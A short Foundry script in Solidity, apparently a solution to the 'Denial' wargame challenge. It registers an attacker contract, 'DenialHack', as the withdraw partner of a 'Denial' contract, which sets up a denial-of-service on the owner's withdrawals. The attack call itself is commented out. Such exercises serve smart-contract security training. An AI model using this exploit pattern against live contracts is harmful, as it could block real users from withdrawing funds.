// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {DenialHack} from "../src/DenialHack.sol";
import {Denial} from "../src/Denial.sol";

contract HackDenialScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        DenialHack denialHack = helperConfig.getDenialConfig().denialHack;
        Denial denial = helperConfig.getDenialConfig().denial;
        vm.startBroadcast();
        denial.setWithdrawPartner(address(denialHack));

        // denialHack.attack();
        vm.stopBroadcast();
    }
}
